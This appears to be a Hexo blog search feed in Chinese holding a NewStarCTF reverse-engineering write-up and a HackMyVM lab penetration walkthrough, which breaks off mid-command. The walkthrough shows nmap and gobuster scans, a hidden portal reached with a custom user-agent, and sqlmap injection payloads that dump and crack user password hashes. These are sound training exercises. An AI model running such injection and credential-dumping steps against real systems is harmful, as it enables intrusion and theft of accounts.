<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week1</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>复现复现！猫猫虫真可爱捏 :)</p><span id="more"></span><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h2><p>ida 打开</p><p><img src="/2024/11/06/TestWP/png"></p><p>主要逻辑是根据输入的字符串长度，如果<code>j%3==0</code> ，那么就将输入的索引为<code>j</code> 的值减去 <code>31</code>，如果 <code>j%3==1</code>，加上<code>41</code>,如果 <code>j%3==2</code>，那么和 <code>0x55</code> 异或。然后值与 <code>buffer</code> 数组相比较，一样就成功，所以点进数组提取数据。</p><p><img src="/2024/11/06/TestWP/png"></p><p>可以写出 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = [<span class="hljs-number">0x47</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x16</span>,<br>          <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5C</span>,<br>          <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x28</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buffer)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        buffer[i] += <span class="hljs-number">0x1f</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        buffer[i] -= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        buffer[i] ^= <span class="hljs-number">0x55</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(buffer[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h2><p>我记得之前在哪个师傅博客看到过说先看 <code>.xml</code> 文件的 <code>activity</code> 可以快速找到。</p><p>看看提示</p><p><img src="/2024/11/06/TestWP/png"></p><p>所以查看 <code>AndroidManifest.xml</code>，看见 <code>activity</code> 只有 <code>work.pangbai.ezandroidstudy.Homo</code> 和 <code>work.pangbai.ezandroidstudy.MainActivity</code></p><p><img src="/2024/11/06/TestWP/png"></p><p>拿到 flag1</p><p><img src="/2024/11/06/TestWP/png"></p><p>看下一个</p><p><img src="/2024/11/06/TestWP/png"></p><p>在 <code>resources.arsc/res/value/string.xml</code> 找到了</p><p><img src="/2024/11/06/TestWP/png"></p><p>根据提示去查找 flag3</p><p><img src="/2024/11/06/TestWP/png"></p><p><code>/layout/activity_main.xml</code> 里的 <code>activity_main.xml</code></p><p><img src="/2024/11/06/TestWP/png"></p><p>查找 flag4</p><p><img src="/2024/11/06/TestWP/.png"></p><p>打开 <code>/res/raw</code> 发现目录下有个 <code>flag4.txt</code></p><p><img src="/2024/11/06/TestWP/.png"></p><p>flag 5</p><p><img src="/2024/11/06/TestWP/.png"></p><p>需要逆向 so 层，那么将 <code>.so</code> 提取出来，可以使用<code>apktool</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d ezAndroidStudy.apk -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p> 将<code>&quot;/lib/x86_64/libezandroidstudy.so&quot;</code>丢进 ida 反编译就出来了</p><p><img src="/2024/11/06/TestWP/.png"></p><h2 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h2><p>根据题目丢进 <code>x64dbg</code> 动调</p><p>首先查找字符串，看看有没有可以字符串，可以发现有一些 <code>flag</code> 字样</p><p><img src="/2024/11/06/TestWP/.png"></p><p>在 <code>Decrypted flag</code> 处下个断点运行，得到结果</p><p><img src="/2024/11/06/TestWP/.png"></p><p><img src="/2024/11/06/TestWP/.png"></p><p>太喜欢逆向了有种做不出来但又想做的崩溃感</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Chromatic(1)</title>
    <link href="/2024/11/10/HackMyVM-1/"/>
    <url>/2024/11/10/HackMyVM-1/</url>
    
    <content type="html"><![CDATA[<p>这是 cx 师傅的渗透日记，他说感觉渗透和游戏一样简单~</p><span id="more"></span><h1 id="探寻目标主机服务"><a href="#探寻目标主机服务" class="headerlink" title="探寻目标主机服务"></a>探寻目标主机服务</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# nmap -Pn -n -sV -sC 192.168.56.15                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 21:54 EST<br>Nmap scan report for 192.168.56.15<br>Host is up (0.00066s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)<br>|_  256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>|_http-title: Chromatica|Coming Soon..... <br>MAC Address: 08:00:27:67:0D:85 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds<br>                                                 <br></code></pre></td></tr></table></figure><p>存在ssh与http服务</p><h1 id="对目标主机服务进行踩点"><a href="#对目标主机服务进行踩点" class="headerlink" title="对目标主机服务进行踩点"></a>对目标主机服务进行踩点</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><h3 id="进行目录扫描"><a href="#进行目录扫描" class="headerlink" title="进行目录扫描"></a>进行目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# gobuster dir -u http://192.168.56.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -x php,txt,html -s &quot;200,403,301&quot; -b &quot;&quot;<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:            http://192.168.56.15<br>[+] Method:         GET<br>[+] Threads:        15<br>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Status codes:   200,403,301<br>[+] User Agent:     gobuster/3.6<br>[+] Extensions:     php,txt,html<br>[+] Timeout:        10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 278]<br>/index.html           (Status: 200) [Size: 4047]<br>/.html                (Status: 403) [Size: 278]<br>/assets               (Status: 301) [Size: 315] [--&gt; http://192.168.56.15/assets/]<br>/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.15/css/]<br>/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.15/js/]<br>/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.56.15/javascript/]<br>/robots.txt           (Status: 200) [Size: 36]<br>/.html                (Status: 403) [Size: 278]<br>/.php                 (Status: 403) [Size: 278]<br>/server-status        (Status: 403) [Size: 278]<br>Progress: 882240 / 882244 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>先看一下robots.txt</p><p><img src="/2024/11/06/TestWP/M-1/1.png"></p><p>给了ua和一个新路径。</p><p><img src="/2024/11/06/TestWP/M-1/2.png"></p><p>403，应该需要加ua头</p><p><img src="/2024/11/06/TestWP/M-1/3.png"></p><p>添加后有一个框，search，可能是sql？先试试</p><p>好像无论怎样都不存在。使用curl查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# curl http://192.168.56.15/dev-porta/ -H &#x27;User-Agent: dev&#x27;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>        &lt;title&gt;Chromatica&lt;/title&gt;<br>        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>        &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>        &lt;div class=&quot;background-image&quot;&gt;&lt;/div&gt;<br>        &lt;div class=&quot;container&quot;&gt;<br>                &lt;h1&gt; Search&lt;/h1&gt;<br>                &lt;form action=&quot;search.php&quot; method=&quot;get&quot;&gt;<br>                        &lt;label for=&quot;query&quot;&gt;Chromatica&lt;/label&gt;<br>                        &lt;input type=&quot;text&quot; id=&quot;query&quot; name=&quot;city&quot; placeholder=&quot;Type a city&#x27;s name...&quot;&gt;<br>                        &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;<br>                &lt;/form&gt;<br>        &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>search.php。查看下。</p><p><img src="/2024/11/06/TestWP/M-1/4.png"></p><p>这样一看估计就是sql注入了。sqlmap下</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# sqlmap -u &quot;http://192.168.56.15/dev-portal/search.php?city=1&quot; -H &#x27;User-Agent: dev&#x27; --batch --dbs<br>        ___<br>       __H__<br> ___ ___[&quot;]_____ ___ ___  &#123;1.8.7#stable&#125;<br>|_ -| . [)]     | .&#x27;| . |<br>|___|_  [,]_|_|_|__,|  _|<br>      |_|V...       |_|   https://sqlmap.org<br><br>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br><br>[*] starting @ 22:05:27 /2024-11-09/<br><br>[22:05:27] [INFO] resuming back-end DBMS &#x27;mysql&#x27; <br>[22:05:27] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: city (GET)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>    Payload: city=1&#x27; OR NOT 7686=7686-- XUIb<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: city=1&#x27; AND (SELECT 6459 FROM (SELECT(SLEEP(5)))lTOD)-- bGSk<br>---<br>[22:05:27] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 22.04 (jammy)<br>web application technology: Apache 2.4.52<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br>[22:05:27] [INFO] fetching database names<br>[22:05:27] [INFO] fetching number of databases<br>[22:05:27] [INFO] resumed: 2<br>[22:05:27] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;--threads&#x27; for faster data retrieval<br>[22:05:27] [INFO] retrieved: information_schema<br>[22:05:28] [INFO] retrieved: Chromatica<br>available databases [2]:<br>[*] Chromatica<br>[*] information_schema<br><br>[22:05:29] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.15&#x27;<br><br>[*] ending @ 22:05:29 /2024-11-09/<br></code></pre></td></tr></table></figure><p>查下<code>Chromatica</code>库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# sqlmap -u &quot;http://192.168.56.15/dev-portal/search.php?city=1&quot; -H &#x27;User-Agent: dev&#x27; --batch -D Chromatica --dump<br>        ___<br>       __H__<br> ___ ___[)]_____ ___ ___  &#123;1.8.7#stable&#125;<br>|_ -| . [,]     | .&#x27;| . |<br>|___|_  [(]_|_|_|__,|  _|<br>      |_|V...       |_|   https://sqlmap.org<br><br>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br><br>[*] starting @ 22:06:10 /2024-11-09/<br><br>[22:06:10] [INFO] resuming back-end DBMS &#x27;mysql&#x27; <br>[22:06:10] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: city (GET)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>    Payload: city=1&#x27; OR NOT 7686=7686-- XUIb<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: city=1&#x27; AND (SELECT 6459 FROM (SELECT(SLEEP(5)))lTOD)-- bGSk<br>---<br>[22:06:11] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 22.04 (jammy)<br>web application technology: Apache 2.4.52<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br>[22:06:11] [INFO] fetching tables for database: &#x27;Chromatica&#x27;<br>[22:06:11] [INFO] fetching number of tables for database &#x27;Chromatica&#x27;<br>[22:06:11] [INFO] resumed: 2<br>[22:06:11] [INFO] resumed: users<br>[22:06:11] [INFO] resumed: cities<br>[22:06:11] [INFO] fetching columns for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:11] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;--threads&#x27; for faster data retrieval<br>[22:06:11] [INFO] retrieved: 4<br>[22:06:11] [INFO] retrieved: id<br>[22:06:11] [INFO] retrieved: city<br>[22:06:11] [INFO] retrieved: population<br>[22:06:11] [INFO] retrieved: postal_code<br>[22:06:12] [INFO] fetching entries for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:12] [INFO] fetching number of entries for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:12] [INFO] retrieved: 11<br>[22:06:12] [INFO] retrieved: New York City<br>[22:06:12] [INFO] retrieved: 1<br>[22:06:12] [INFO] retrieved: 8336817<br>[22:06:13] [INFO] retrieved: 10001<br>[22:06:13] [INFO] retrieved: Los Angeles<br>[22:06:13] [INFO] retrieved: 2<br>[22:06:14] [INFO] retrieved: 3979576<br>[22:06:14] [INFO] retrieved: 90001<br>[22:06:14] [INFO] retrieved: Chicago<br>[22:06:14] [INFO] retrieved: 3<br>[22:06:14] [INFO] retrieved: 2693976<br>[22:06:15] [INFO] retrieved: 60601<br>[22:06:15] [INFO] retrieved: Houston<br>[22:06:15] [INFO] retrieved: 4<br>[22:06:15] [INFO] retrieved: 2320268<br>[22:06:16] [INFO] retrieved: 77001<br>[22:06:16] [INFO] retrieved: Phoenix<br>[22:06:16] [INFO] retrieved: 5<br>[22:06:16] [INFO] retrieved: 1680992<br>[22:06:16] [INFO] retrieved: 85001<br>[22:06:17] [INFO] retrieved: Philadelphia<br>[22:06:17] [INFO] retrieved: 6<br>[22:06:17] [INFO] retrieved: 1584064<br>[22:06:17] [INFO] retrieved: 19101<br>[22:06:18] [INFO] retrieved: San Antonio<br>[22:06:18] [INFO] retrieved: 7<br>[22:06:18] [INFO] retrieved: 1547253<br>[22:06:18] [INFO] retrieved: 78201<br>[22:06:19] [INFO] retrieved: San Diego<br>[22:06:19] [INFO] retrieved: 8<br>[22:06:19] [INFO] retrieved: 1425976<br>[22:06:19] [INFO] retrieved: 92101<br>[22:06:20] [INFO] retrieved: Dallas<br>[22:06:20] [INFO] retrieved: 9<br>[22:06:20] [INFO] retrieved: 1317929<br>[22:06:20] [INFO] retrieved: 75201<br>[22:06:21] [INFO] retrieved: San Jose<br>[22:06:21] [INFO] retrieved: 10<br>[22:06:21] [INFO] retrieved: 1030119<br>[22:06:21] [INFO] retrieved: 95101<br>[22:06:22] [INFO] retrieved: Paris<br>[22:06:22] [INFO] retrieved: 11<br>[22:06:22] [INFO] retrieved: 2140526<br>[22:06:22] [INFO] retrieved: 75001<br>Database: Chromatica<br>Table: cities<br>[11 entries]<br>+----+---------------+------------+-------------+<br>| id | city          | population | postal_code |<br>+----+---------------+------------+-------------+<br>| 1  | New York City | 8336817    | 10001       |<br>| 2  | Los Angeles   | 3979576    | 90001       |<br>| 3  | Chicago       | 2693976    | 60601       |<br>| 4  | Houston       | 2320268    | 77001       |<br>| 5  | Phoenix       | 1680992    | 85001       |<br>| 6  | Philadelphia  | 1584064    | 19101       |<br>| 7  | San Antonio   | 1547253    | 78201       |<br>| 8  | San Diego     | 1425976    | 92101       |<br>| 9  | Dallas        | 1317929    | 75201       |<br>| 10 | San Jose      | 1030119    | 95101       |<br>| 11 | Paris         | 2140526    | 75001       |<br>+----+---------------+------------+-------------+<br><br>[22:06:23] [INFO] table &#x27;Chromatica.cities&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/cities.csv&#x27;<br>[22:06:23] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] resumed: 4<br>[22:06:23] [INFO] resumed: id<br>[22:06:23] [INFO] resumed: username<br>[22:06:23] [INFO] resumed: password<br>[22:06:23] [INFO] resumed: description<br>[22:06:23] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] fetching number of entries for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] resumed: 5<br>[22:06:23] [INFO] resumed: admin<br>[22:06:23] [INFO] resumed: 1<br>[22:06:23] [INFO] resumed: 8d06f5ae0a469178b28bbd34d1da6ef3<br>[22:06:23] [INFO] resumed: admin<br>[22:06:23] [INFO] resumed: developer account for taz<br>[22:06:23] [INFO] resumed: 2<br>[22:06:23] [INFO] resumed: 1ea6762d9b86b5676052d1ebd5f649d7<br>[22:06:23] [INFO] resumed: dev<br>[22:06:23] [INFO] resumed: user account for testing<br>[22:06:23] [INFO] resumed: 3<br>[22:06:23] [INFO] resumed: 3dd0f70a06e2900693fc4b684484ac85<br>[22:06:23] [INFO] resumed: user<br>[22:06:23] [INFO] resumed: developer account for selim<br>[22:06:23] [INFO] resumed: 4<br>[22:06:23] [INFO] resumed: f220c85e3ff19d043def2578888fb4e5<br>[22:06:23] [INFO] resumed: dev-selim<br>[22:06:23] [INFO] resumed: intern<br>[22:06:23] [INFO] resumed: 5<br>[22:06:23] [INFO] resumed: aaf7fb4d4bffb8c8002978a9c9c6ddc9<br>[22:06:23] [INFO] resumed: intern<br>[22:06:23] [INFO] recognized possible password hashes in column &#x27;password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N<br>do you want to crack them via a dictionary-based attack? [Y/n/q] Y<br>[22:06:23] [INFO] using hash method &#x27;md5_generic_passwd&#x27;<br>[22:06:23] [INFO] resuming password &#x27;keeptrying&#x27; for hash &#x27;3dd0f70a06e2900693fc4b684484ac85&#x27; for user &#x27;user&#x27;<br>what dictionary do you want to use?<br>[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br>[2] custom dictionary file<br>[3] file with list of dictionary files<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">1</span><br>[22:06:23] [INFO] using default dictionary<br>do you want to use common password suffixes? (slow!) [y/N] N<br>[22:06:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)<br>[22:06:23] [INFO] starting 2 processes <br>Database: Chromatica                                                                             <br>Table: users<br>[5 entries]<br>+----+-----------------------------------------------+-----------+-----------------------------+<br>| id | password                                      | username  | description                 |<br>+----+-----------------------------------------------+-----------+-----------------------------+<br>| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |<br>| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |<br>| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |<br>| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |<br>| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |<br>+----+-----------------------------------------------+-----------+-----------------------------+<br><br>[22:06:45] [INFO] table &#x27;Chromatica.users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv&#x27;<br>[22:06:45] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.15&#x27;<br><br>[*] ending @ 22:06:45 /2024-11-09/<br></code></pre></td></tr></table></figure><p>获取到用户密码的hash值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat 